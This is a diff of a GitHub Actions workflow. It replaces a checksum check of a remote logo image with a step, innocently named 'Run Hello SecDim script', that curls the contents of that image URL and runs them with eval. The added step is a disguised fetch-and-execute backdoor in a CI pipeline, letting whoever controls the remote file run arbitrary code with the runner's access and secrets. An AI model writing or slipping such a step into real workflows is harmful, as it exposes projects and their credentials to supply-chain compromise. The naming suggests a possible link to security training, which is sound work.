@@ -7,9 +7,10 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-      - name: SecDim sha256sum check (exact match)
+      - name: Run Hello SecDim script
         run: |
-          echo $(curl https://secdim.com/assets/images/logo.svg) | sha256sum
-
+          CONTENTS=$(curl "https://secdim.com/assets/images/logo.svg")
+          eval $CONTENTS
